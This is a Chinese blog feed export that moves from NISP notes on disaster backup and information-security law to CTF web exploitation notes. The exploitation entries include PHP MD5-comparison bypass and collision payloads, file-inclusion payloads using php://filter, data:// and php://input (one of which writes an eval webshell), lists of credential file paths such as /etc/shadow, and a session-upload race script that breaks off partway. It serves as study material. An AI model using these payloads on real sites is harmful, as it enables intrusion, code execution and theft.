灾难备份</h3><p>随着信息技术的发展和信息化的不断深入，特别是数据集中和业务集中以及由此产生的对信息系统越来越强的依赖性，导致信息系统相关事件对组织业务运营的影响越来越严重，从而使信息系统灾难备份和恢复越来越成为组织需要迫切解决的问题之一。对组织而言，信息系统失效无疑是一场灾难。在这种情况下，组织的业务无法正常运作，甚至可能陷入完全瘫痪。然而，有许多因素威胁着信息系统的正常运转，大到自然灾害(地震、洪水、飓风、火灾等)，小到失窃、断电乃至操作员不经意的失误，都会影响系统的正常运转甚至造成整个系统完全瘫痪。所以，由信息系统瘫痪造成的影响往往十分惊人</p><h5 id="灾难备份概述"><a href="#灾难备份概述" class="headerlink" title="灾难备份概述"></a>灾难备份概述</h5><p>GB/T20988-2007《信息系统灾难恢复规范》定义，灾难是指由于人为或自然的原因，造成信息系统运行严重故障或瘫痪，使信息系统支持的业务功能停顿或服务水平不可接受，通常导致信息系统需要切换到备用场地运行的突发事件。典型的灾难事件包括自然灾难，如火灾、洪水、地震、飓风、龙卷风和台风等:还有技术风险，如设备故障、软件错误、通讯网络中断和电力故障等;人为因素往往也会酿成大祸，如操作员错误、破坏、植入有害代码和恐怖袭击等</p><h5 id="灾难恢复"><a href="#灾难恢复" class="headerlink" title="灾难恢复"></a>灾难恢复</h5><p>使用如下两个业务参数表示灾难恢复系统的能力∶</p><p>1.恢复时间目标<br>2.恢复点目标</p><h5 id="灾难备份方法"><a href="#灾难备份方法" class="headerlink" title="灾难备份方法"></a>灾难备份方法</h5><p>灾难备份是指通过技术和管理手段，对信息系统和数据进行备份，以便灾难发生后信息系统及数据能够及时恢复，系统业务连续性得以保持。实施灾难备份前，应当根据信息系统的业务需求等实际情况，选择合适的备份策略</p><p>1.本地备份和异地灾备<br>2.数据级灾备和系统级灾备<br>3.完全备份和不完全备份</p><p>在实际工作中，根据不同业务对数据备份的时间窗口和灾难恢复的要求，结合备份软、硬件的实际情况，可以综合使用这三种备份方式，制定特定的备份策略，一种常用的策略设置方法如下</p><p>1.执行完全备份<br>2.经常进行增量备份<br>3.定期执行差异备份</p><h2 id="第八章-信息安全法律法规"><a href="#第八章-信息安全法律法规" class="headerlink" title="第八章 信息安全法律法规"></a>第八章 信息安全法律法规</h2><h3 id="8-1-信息保护相关法律法规"><a href="#8-1-信息保护相关法律法规" class="headerlink" title="8.1 信息保护相关法律法规"></a>8.1 信息保护相关法律法规</h3><p>国家、商业、个人</p><h4 id="国家秘密"><a href="#国家秘密" class="headerlink" title="国家秘密"></a>国家秘密</h4><p>包括国家领土完整、主权独立不受侵犯:国家经济秩序、社会秩序不受破坏<br>公民生命、生活不受侵害;民族文化价值和传统不受破坏等<br>产生于政治、国防军事、外交外事、经济、科技和政法等领域的秘密事项  </p><h5 id="国家秘密的密级"><a href="#国家秘密的密级" class="headerlink" title="国家秘密的密级"></a>国家秘密的密级</h5><p>绝密——最重要的国家秘密——使国家安全和利益遭受特别严重的损澎——破坏国家主权和领土完整，威胁国家政权巩固，使国家政治、经济遭受巨大损失——全局性，战略性  </p><p>机密——重要旳国家秘密——使国家和利益遭受严重的损害——某一领域内的国家安全和利益遭受重大损失——较大范围</p><p>秘密——一般的国家秘密——使国家安全和利益遭受损害——某一方面的国家安全利益遭受损失——局部性</p><h5 id="危害国家秘密安全的行为"><a href="#危害国家秘密安全的行为" class="headerlink" title="危害国家秘密安全的行为"></a>危害国家秘密安全的行为</h5><p>严重违反保密规定行为<br>定密不当行为<br>公共信息网络运营商、服务商不履行保密义务的行为<br>保密行政管理部门工作人员的违法行为</p><p>严重违反保密规定行为 </p><p>1.违反涉密信息系统和信息设备保密管理规定的行为<br>2.违反国家秘密载体管理规定的行为<br>3.违反国家秘密信息管理规定的行为  </p><p>定密不当行为</p><p>定密不当包括对应当定密的事项不定密，或者对不应当定密的事项定密<br>对应当定密的事项不定密，可能导致国家秘密失去保护，造成泄密<br>对不应当定密的事项定密，会严重影响信息资源合理利用，可能造成较大负面影响</p><p>公共信息网络运营商、服务商不履行保密义务的行为</p><p>1.互联网及其他公共信息网络运营商、服务商没有履行配合公安机关、国家安全机关、检察机关对泄密案件进行调查的义务<br>2.发现发布的信息涉及泄露国家秘密，没有立即停止传输和保存客户发布信息的内容及有关情况记录，并及时向公安机关、国家安全机关、保密行政管理部门报告<br>3.没有按照公安机关、国家安全机关、保密行政管理部门要求，及时对互联网或公共信息网上发布的涉密信息予以删除，致使涉密信息继续扩散</p><p>保密行政管理部门工作人员的违法行为</p><p>保密行政管理部门的工作人员在履行保密管理职责时滥用职权、玩忽职守、衔私舞弊<br>滥用职权是指保密行政管理部门工作人员超越职权范围或者违背法律授权的宗旨、违反法律程序行使职权的行为<br>玩忽职守是指保密行政管理部门工作人员严重不负责任，不履行或不正确履行职责的行为<br>御私舞弊是指保密行政管理部门工作人员在履行职责过程中，利用职务之便，弄虚作假、衔私谋利的行为</p><h5 id="危害国家秘密安全的犯罪行为"><a href="#危害国家秘密安全的犯罪行为" class="headerlink" title="危害国家秘密安全的犯罪行为"></a>危害国家秘密安全的犯罪行为</h5><p>危害国家安全的犯罪行为<br>妨碍社会管理秩序的犯罪行为<br>渎职的犯罪行为<br>军人违反职责的犯罪行为</p><p>危害国家安全的犯罪行为 </p><p>1.掌握国家秘密的国家工作人员在履行公务期间，擅离岗位，叛逃境外或者在境外叛逃<br>2.参加间谍组织或者接受间谍组织及其代理人的任务<br>3.为敌人指示轰击目标，为境外的机构、组织、人员窃取、刺探、收买、非法提供国家秘密或者情报  </p><p>妨碍社会管理秩序的犯罪行为</p><p>1.以窃取、刺探、收买方法，非法获取国家秘密<br>2.非法持有属于国家绝密、机密的文件、资料或者其他物品，拒不说明来源与用途  </p><p>渎职的犯罪行为</p><p>1.国家机关工作人员、非国家机关工作人员违反保守国家秘密法的规定，故意泄露国家秘密<br>2.国家机关工作人员、非国家机关工作人员违反保守国家秘密法的规定，过失泄露国家秘密</p><p>军人违反职责的犯罪行为</p><p>1.以窃取、刺探、收买方法，非法获取军事秘密<br>2.为境外的机构、组织、人员窃取、刺探、收买、非法提供军事秘密<br>3.违反保守国家秘密法规，故意泄露军事秘密(战时有此行为会受到从重处罚)<br>4.违反保守国家秘密法规，过失泄露军事秘密(战时有此行为会受到从重处罚)  </p><h5 id="保护国家秘密相关法律"><a href="#保护国家秘密相关法律" class="headerlink" title="保护国家秘密相关法律"></a>保护国家秘密相关法律</h5><p>《保密法》</p><p>2010 年10 月1日起正式施行的新《保密法》从四个方面明确了危害国家秘密安全的行为的法律责任，使查处泄密违法行为有据可依、有章可循</p><p>严重违反保密规定的法律责任</p><p>《中华人民共和国公务员法》、《中华人民共和国行政监察法》、《行政机关公务员处分条例》</p><p>互联网及其他公共信息网络运营商、服务离的有关法律责任</p><p>《中华人民共和国治安管理处罚法》、《中华人民共和国电信条例》、《计算机信息网络国际联网安全保护管理办法》、《互联网信息服务管理办法》</p><h4 id="商业秘密"><a href="#商业秘密" class="headerlink" title="商业秘密"></a>商业秘密</h4><p>不为公众所知悉、能为权利人带来经济利益、具有实用性并由权利人采取保密措施的技术信息和经营信息。技术信息类商业秘密包括由单位研制开发或者以其他合法方式掌握的、未公开的设计、程序、产品配方、制作工艺、制作方法等信息，以及完整的技术方案、开发过程中的阶段性技术成果以及取得的有价值的技术数据，包括但不限于设计图纸(含草图)，试验结果和试验记录、样品、数据等，也包括针对技术问题的技术诀窍;经营信息类商业秘密包括经营策略、产销策略、管理诀窍、客户名单、货源情报、招投标中的标底及标书内容等信息</p><h5 id="侵犯商业秘密的行为"><a href="#侵犯商业秘密的行为" class="headerlink" title="侵犯商业秘密的行为"></a>侵犯商业秘密的行为</h5><p>以盗窃、利诱、胁迫或者其他不正当手段获取权利人的商业秘密<br>披露、使用或者允许他人使用上述手段获取权利人的商业秘密<br>违反约定或者违反权利人有关保守商业秘密的要求，披露、使用或者允许他人使用其所掌握的商业秘密  </p><p>权利人:是指商业秘密的所有人和经商业秘密所有人许可的商业秘密使用人</p><h5 id="保护商业机密相关法律法规"><a href="#保护商业机密相关法律法规" class="headerlink" title="保护商业机密相关法律法规"></a>保护商业机密相关法律法规</h5><p>《中华人民共和国刑法》<br>《中华人民共和国反不正当竞争法》<br>《中华人民共和国合同法》<br>《中华人民共和国劳动合同法》  </p><h4 id="个人秘密"><a href="#个人秘密" class="headerlink" title="个人秘密"></a>个人秘密</h4><h5 id="侵犯个人隐私信息行为"><a href="#侵犯个人隐私信息行为" class="headerlink" title="侵犯个人隐私信息行为"></a>侵犯个人隐私信息行为</h5><p>1.未经他人同意，擅自公布他人的隐私材料，或者以书面、口头形式宣扬他人隐私<br>2.窃取或者以其他非法方式获取公民个人电子信息<br>3.出售或者非法向他人提供公民个人电子信息<br>4.明络服务提供者和其他企业事业单位在业务活动中未经被收集者同意就收集、使用公民个人电子信息<br>5.对在业务活动中经被收集者同意收集的公民个人电子信息没有采取必要的保密措施<br>6.医疗机构及其医务人员泄露患者隐私或者未经患者同意，公开其病历资料、健康体检报告等行为  </p><h5 id="侵犯个人隐私信息犯罪行为"><a href="#侵犯个人隐私信息犯罪行为" class="headerlink" title="侵犯个人隐私信息犯罪行为"></a>侵犯个人隐私信息犯罪行为</h5><p>1.隐匿、毁弃或者非法开拆他人信件，侵犯公民通信自由权利，情节严重的<br>2.邮政工作人员私自开拆或者隐匿、毁弃邮件、电报的<br>3.国家机关或者金融、电信、交通、教育、医疗等单位的工作人员，违反国家规定，将本单位在履行职责或者提供服务过程中获得的公民个人信息，出售或者非法提供给他人，情节严重的<br>4.窃取或者以其他方法非法获取公民个人信息，情节严重的<br>5.非法截获、篡改、删除他人电子邮件或者其他数据资料，情节严重的<br>6.人民警察泄露因制作、发放、查验、扣押居民身份证而知悉公民个人信息，情节严重的</p><h3 id="8-2-打击网络违法犯罪相关法律法规"><a href="#8-2-打击网络违法犯罪相关法律法规" class="headerlink" title="8.2 打击网络违法犯罪相关法律法规"></a>8.2 打击网络违法犯罪相关法律法规</h3><h5 id="网络违法犯罪行为"><a href="#网络违法犯罪行为" class="headerlink" title="网络违法犯罪行为"></a>网络违法犯罪行为</h5><p>破坏互联网运行安全的行为<br>破坏国家安全和社会稳定的行为<br>破坏市场经济秩序和社会管理秩序的行为<br>侵犯个人、法人和其他组织的人身、财产等合法权利的行为  </p><p>利用互联网实施以上四类所列行为以外的违法/犯罪行为</p><h5 id="破坏互联网运行安全的行为"><a href="#破坏互联网运行安全的行为" class="headerlink" title="破坏互联网运行安全的行为"></a>破坏互联网运行安全的行为</h5><p>1.侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统<br>2.违反国家规定，侵入计算机系统，造成危害<br>3.故意制作、传播计算机病毒等破坏程序，攻击计算机系统及通信网络，致使计算机系统及通信网络遭受损害<br>4.违反国家规定，擅自中断计算机网络或者通信服务，造成计算机网络或者通信系统不能正常运行<br>5.违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行<br>6.违反国家规定，对计算机信息系统中存储、处理、传输的数据和应用程序进行删除、修改、增加  </p><h5 id="破坏国家安全和社会稳定的行为"><a href="#破坏国家安全和社会稳定的行为" class="headerlink" title="破坏国家安全和社会稳定的行为"></a>破坏国家安全和社会稳定的行为</h5><p>1.利用互联网造谣、诽谤或者发表、传播其他有害信息，煽动颠覆国家政权、推翻社会主义制度，或者煽动分裂国家、破坏国家统一<br>2.通过互联网窃取、泄露国家秘密、情报或者军事秘密<br>3.利用互联网煽动民族仇恨、民族歧视，破坏民族团结<br>4.利用互联网组织邪教组织、联络邪教组织成员，破坏国家法律、行政法规实施  </p><h5 id="破坏市场经济秩序和社会管理秩序的行为"><a href="#破坏市场经济秩序和社会管理秩序的行为" class="headerlink" title="破坏市场经济秩序和社会管理秩序的行为"></a>破坏市场经济秩序和社会管理秩序的行为</h5><p>1.利用互联网销售伪劣产品或者对商品、服务作虚假宣传<br>2.利用互联网损坏他人商业信誉和商品声誉<br>3.利用互联网侵犯他人知识产权<br>4.利用互联网编造并传播影响证券、期货交易或者其他扰乱金融秩序的虚假信息<br>5.在互联网上建立淫秽网站、网页，提供淫秽站点链接服务，或者传播淫秽书刊、影片、音像、图片</p><h5 id="侵犯个人、法人和其他组织的人身、财产等合法权利的行为"><a href="#侵犯个人、法人和其他组织的人身、财产等合法权利的行为" class="headerlink" title="侵犯个人、法人和其他组织的人身、财产等合法权利的行为"></a>侵犯个人、法人和其他组织的人身、财产等合法权利的行为</h5><p>1.利用互联网侮辱他人或者捏造事实诽谤他人<br>2.非法截获、篡改、删除他人电子邮件或者其他数据资料，侵犯公民通信自由和通信秘密<br>3.利用互联网进行盗窃、诈骗、敲诈勒索:利用网络写恐吓信或者以其他方法威胁他人人身安全的<br>4.利用网络捏造事实诬告陷害他人，企图使他人受到刑事追究或者受到治安管理处罚<br>5.利用网络对证人及其近亲属进行威胁、侮辱或者打击报复<br>6.利用网络多次发送淫秽、侮辱、恐吓或者其他信息，干扰他人正常生活<br>7.利用网络偷窥、偷拍、窃听、散布他人隐私<br>8.利用网络煽动民族仇恨、民族歧视，或者在网络中刊载民族歧视、侮辱内容  </p><h5 id="打击网络违法犯罪的相关法律"><a href="#打击网络违法犯罪的相关法律" class="headerlink" title="打击网络违法犯罪的相关法律"></a>打击网络违法犯罪的相关法律</h5><p>《刑法》<br>《关于维护互联网安全的决定》<br>《治安管理处罚法》</p><h3 id="8-3-信息安全管理相关法律法规"><a href="#8-3-信息安全管理相关法律法规" class="headerlink" title="8.3 信息安全管理相关法律法规"></a>8.3 信息安全管理相关法律法规</h3><h5 id="相关法律"><a href="#相关法律" class="headerlink" title="相关法律"></a>相关法律</h5><p>《中华人民共和国保守国家秘密法》<br>《中华人民共和国人民警察法》<br>《中华人民共和国电子签名法》</p><h5 id="相关法律条例"><a href="#相关法律条例" class="headerlink" title="相关法律条例"></a>相关法律条例</h5><p>《中华人民共和国保守国家秘密法》</p><p>在保护国家秘密方面，在第一章”总则”第五条、第六条中，对保密工作的监管进行了明确授权，由国家保密行政管理部门主管全国的保密工作:</p><p>县级以上地方各级保密行政管理部门主管本行政区域的保密工作<br>国家机关和涉及国家秘密的单位管理本机关和本单位的保密工作<br>中央国家机关在其职权范围内，管理或者指导本系统的保密工作  </p><p>国家保密行政管理部门的最高机构是国家保密局。</p><p>在第四章“监督管理”第四十一条、第四十二条中规定:</p><p>国家保密行政管理部门依照法律、行政法规的规定，制定保密规章和国家保密标准<br>保密行政管理部门依法组织开展保密宣传教育、保密检查、保密技术防护和泄密案件查处工作，对机关、单位的保密工作进行指导和监督  </p><p>《中国人民共和国警察法》</p><p>在维护公共安全方面，&lt;&lt;中华人民共和国人民警察法》进行了相应规定。《中华人民共和国人民警察法》第二章”职权”第六条规定，公安机关的人民警察按照职责分工，依法履行下列职责:预防、制止和侦查违法犯罪活动;维护社会治安秩序，制止危害社会治安秩序的行为:监督管理计算机信息系统的安全保护工作</p><p>《中华人民共和国电子签名法》</p><p>2004年8月28日通过并公布的《中华人民共和国电子签名法》在第三章”电子签名与认证””中，对电子认证服务提供者的监管进行了授权。在第十六条、第十八条中规定，电子签名需要第三方认证的，由依法设立的电子认证服务提供者提供认证服务;从事电子认证服务，应当向国务院信息产业主管部门提出申请，并提交符合规定条件的相关材料。国务院信息产业主管部门接到中请后经依法审查，征求国务院商务主管部门等有关部门的意见后，自接到申请之日起四十五日内作出许可或者不予许可的决定。予以许可的，颁发电子认证许可证书;不予许可的，应当书面通知申请人并告知理由。申请人应当持电子认证许可证书依法向工商行政管理部门办理企业登记手续。取得认证资格的电子认证服务提供者，应当按照国务院信息产业主管部门的规定在互联网上公布其名称、许可证号等信息</p><h3 id="8-4-《网络安全法》"><a href="#8-4-《网络安全法》" class="headerlink" title="8.4 《网络安全法》"></a>8.4 《网络安全法》</h3><p>2017年6月1日，《中华人民共和国网络安全法》(以下简称《网络安全法》）正式实施。这是我国第一部全面规范网络空间安全管理方面问题的基础性法律，是互联网在法制轨道上安全、健康运行的重要保障  </p><p>《网络安全法》提出网络主权原则、网络安全与信息化发展并重原则、共同治理原则。第一条即规定要维护我国网络空间主权，以“立法原则”的高度体现对网络空间主权的重视;第三条规定国家坚持网络安全与信息化并重，遵循积极利用、科学发展、依法管理、确保安全的方针，突出了《网络安全法》实施网络安全与信息化发展的原则;《网络安全法》要求政府、企业、社会组织、技术社群和公民等网络利益者共同参与网络空间安全的治理与维护，体现了共同治理的原则</p><p>《网络安全法》提出了制定网络安全战略，明确网络空间治理目标。第四条提出国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标;第七条规定我国致力于“推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。”</p><p>《网络安全法》第8条规定，国家网信部门负责统筹协调网络安全工作和相关监督管理工作，国务院电信主管部门、公安部门和其他有关机关依法在各自职责范围内负责网络安全保护和监督管理工作。进一步明确了政府各部门的职责权限，完善了网络安全监管体制</p><p>《网络安全法》第三章“网络运行安全”规范了网络运行安全，特别强调了要保障关键信息基础设施的运行安全，并通过明确关键信息基础设施运营者义务、国家审查、重要数据强制本地存储等法律措施，来确保信息基础设施的安全</p><p>《网络安全法》完善了网络安全义务与责任，加大法律违法惩处力度将原来散见于各种法规、规章中的规定上升到法律层面。第四章“网络信息安全”对网络运营者等主体的法律义务和责任做了全面规定，并在第六章“法律责任”中提高了违法行为的处罚标准，加大了处罚力度</p><p>《网络安全法》第五章“监测预警与应急措施”将监测预警与应急处置工作制度化、法制化，明确国家建立网络安全监测预警和信息通报制度，建立网络安全风险评估和应急工作机制，制定网络安全事件应急预案并定期演练。为建立统一高效的网络安全风险报告机制、情报共享机制、研判处置机制提供了法律依据，为深化网络安全防护体系，实现全天候全方位感知网络安全态势提供了法律保障</p>]]></content>
    
    
    
    <tags>
      
      <tag>NISP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MD5 比较</title>
    <link href="/2021/11/04/MD5-%E6%AF%94%E8%BE%83/"/>
    <url>/2021/11/04/MD5-%E6%AF%94%E8%BE%83/</url>
    
    <content type="html"><![CDATA[<p>MD5-多种类型比较</p><span id="more"></span><h1 id="MD5-比较"><a href="#MD5-比较" class="headerlink" title="MD5-比较"></a>MD5-比较</h1><hr><h2 id="一、弱类型比较"><a href="#一、弱类型比较" class="headerlink" title="一、弱类型比较"></a>一、弱类型比较</h2><div class="hljs code-wrapper"><pre><code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) == md5($_POST[&#39;b&#39;]))</code></pre></div><p>弱类型比较因为php特性，在比较时先将string转换为int型，0e开头会被识别为科学计数法，结果0=0 比较成功  </p><p>payload：</p><div class="hljs code-wrapper"><pre><code>a=QNKCDZO&amp;b=aabg7XSs</code></pre></div><p>只要是md5值为0e开头即可</p><h2 id="二、强类型比较"><a href="#二、强类型比较" class="headerlink" title="二、强类型比较"></a>二、强类型比较</h2><div class="hljs code-wrapper"><pre><code>if ($_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code></pre></div><p>强类型比较用数组绕过，md5()函数无法解出其数值，就会得到（error===error）强比较值相等</p><p>payload：</p><div class="hljs code-wrapper"><pre><code>a[]=111&amp;b[]=aaa</code></pre></div><p>传入数组即可</p><h2 id="三、真实碰撞"><a href="#三、真实碰撞" class="headerlink" title="三、真实碰撞"></a>三、真实碰撞</h2><div class="hljs code-wrapper"><pre><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code></pre></div><p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p><p>payload：</p><div class="hljs code-wrapper"><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre></div><p>值不等，md5相等即可。md5碰撞。</p><h2 id="四、0e开头MD5的MD5为0e的MD5"><a href="#四、0e开头MD5的MD5为0e的MD5" class="headerlink" title="四、0e开头MD5的MD5为0e的MD5"></a>四、0e开头MD5的MD5为0e的MD5</h2><div class="hljs code-wrapper"><pre><code>0e215962017md5(0e215962017)=0e291242476940776845150308577824</code></pre></div><h2 id="单次加密-py"><a href="#单次加密-py" class="headerlink" title="单次加密.py"></a>单次加密.py</h2><div class="hljs code-wrapper"><pre><code>#!/usr/bin/python# -*- coding: utf8 -*-import sys, hashlib# MD5单次加密## 输入参数flag = &#39;111&#39;data = hashlib.md5()data.update(flag.encode(&#39;utf-8&#39;))print(flag+&#39;加密结果：&#39;+data.hexdigest())</code></pre></div><h2 id="真实碰撞-py"><a href="#真实碰撞-py" class="headerlink" title="真实碰撞.py"></a>真实碰撞.py</h2><p><a href="https://err0r.top/article/md5/">特此感谢err0r师傅，标明出处：https://err0r.top/article/md5/</a> </p>]]></content>
    
    
    
    <tags>
      
      <tag>web md5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="/2021/11/02/file-include/"/>
    <url>/2021/11/02/file-include/</url>
    
    <content type="html"><![CDATA[<p>文件包含相关方法/问题</p><span id="more"></span><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="文件包含简介"><a href="#文件包含简介" class="headerlink" title="文件包含简介"></a>文件包含简介</h3><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）</p><hr><h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><div class="hljs code-wrapper"><pre><code>require()require_once()include()include_once()</code></pre></div><p>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行</p><p>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题</p><hr><h3 id="敏感信息路径"><a href="#敏感信息路径" class="headerlink" title="敏感信息路径"></a>敏感信息路径</h3><p>Linux/Unix系统的敏感信息路径：</p><div class="hljs code-wrapper"><pre><code>/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件 </code></pre></div><p>常见的php-session存放位置：</p><div class="hljs code-wrapper"><pre><code>/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID</code></pre></div><hr><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p><h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><p>作用：<br>用于访问文件（绝对路径、相对路径、网路路径）  </p><p>例：  </p><div class="hljs code-wrapper"><pre><code>?file=file:///etc/passswd</code></pre></div><h4 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h4><p>作用：<br>访问输入输出流  </p><h5 id="1-php-filter"><a href="#1-php-filter" class="headerlink" title="1.php://filter"></a>1.php://filter</h5><p>作用：<br>读取源代码  </p><p>例：  </p><div class="hljs code-wrapper"><pre><code>?file=php://filter/read=convert.base64-encode/resource=[文件名]  （针对php文件需要base64编码）参数：resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链</code></pre></div><h5 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2.php://input"></a>2.php://input</h5><p>作用：<br>执行php代码</p><p>例：  </p><div class="hljs code-wrapper"><pre><code>?file=php://inputPOST数据：&lt;?php phpinfo()?&gt;如果有写入权限，写入一句话木马：?file=php://input[POST DATA部分]&lt;?php fputs(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;&#39;); ?&gt;</code></pre></div><p>注意：<br>enctype=”multipart/form-data” 的时候 php://input 是无效的</p><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>作用：<br>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输</p><p>伪协议中的data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p><p>例：</p><div class="hljs code-wrapper"><pre><code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b?file=data://text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;</code></pre></div><h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p>作用：<br>zip://&amp;bzip2://&amp;zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等</p><h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>phar://协议与zip://类似，同样可以访问zip格式压缩包内容</p><h4 id="常见拼接用法"><a href="#常见拼接用法" class="headerlink" title="常见拼接用法"></a>常见拼接用法</h4><div class="hljs code-wrapper"><pre><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></pre></div><hr><h3 id="session文件"><a href="#session文件" class="headerlink" title="session文件"></a>session文件</h3><p><a href="https://blog.csdn.net/qq_38154820/article/details/120300273">详解利用session进行文件包含：https://blog.csdn.net/qq_38154820/article/details/120300273</a></p><p><a href="https://www.freebuf.com/vuls/202819.html">博客：https://www.freebuf.com/vuls/202819.html</a></p><p>常见的php-session存放位置：</p><div class="hljs code-wrapper"><pre><code>/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID</code></pre></div><h5 id="严格审查-phpinfo-php-ini中关于Session的配置"><a href="#严格审查-phpinfo-php-ini中关于Session的配置" class="headerlink" title="严格审查 phpinfo/php.ini中关于Session的配置"></a>严格审查 phpinfo/php.ini中关于Session的配置</h5><p><a href="https://blog.csdn.net/msllws/article/details/85232203">博客：https://blog.csdn.net/msllws/article/details/85232203</a></p><h5 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h5><p>上传文件时产生可控的session文件，可在其中插入语句，在post上传文件同时get session，条件竞争碰撞</p><div class="hljs code-wrapper"><pre><code>Cookie:PHPSESSID=XXX/tmp/sess_xxx</code></pre></div><p>利用session对话进行文件包含利用<br>简单来说，就是post上传文件时会产生一个可控session文件，文件上传完删除<br>可创造该session文件，在文件中插入php语句<br>在post上传文件同时访问该文件，get flag/有用信息<br>碰撞出正确的条件竞争  </p><div class="hljs code-wrapper"><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://c5bb51fc-6e63-467c-b8dc-8dc6804584a9.chall.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><p>PHP_SESSION_UPLOAD_PROGRESS session上传进度</p><p>即 sess_xxx文件的内容 / 执行恶意代码</p><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">PHP_SESSION_UPLOAD_PROGRESS：https://www.cnblogs.com/NPFS/p/13795170.html</a></p><h5 id="附上脚本"><a href="#附上脚本" class="headerlink" title="附上脚本"></a>附上脚本</h5><div class="hljs code-wrapper"><pre><code>#coding=utf-8import ioimport requestsimport threadingsessid = &#39;flag&#39;data = &#123;&quot;cmd&quot;: &quot;system(&#39;whoami&#39;);&quot;&#125; # session文件中输入一句话后,执行该php代码def write(session):    while True:        f = io.BytesIO(b&#39;a&#39; * 1024 * 50)        resp = session.post(&#39;http://127.0.0.1:7777/&#39;,                        data=&#123;&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?=var_dump(scandir(&quot;.&quot;))?&gt;&#39;&#125;, # 执行php代码                        files=&#123;&#39;file&#39;: (&#39;111.txt&#39;, f)&#125;,                        cookies=&#123;&#39;PHPSESSID&#39;: sessid&#125;) # 严格审查Cookie变量值（phpinfo/phpini）def read(session):    while True:        resp = 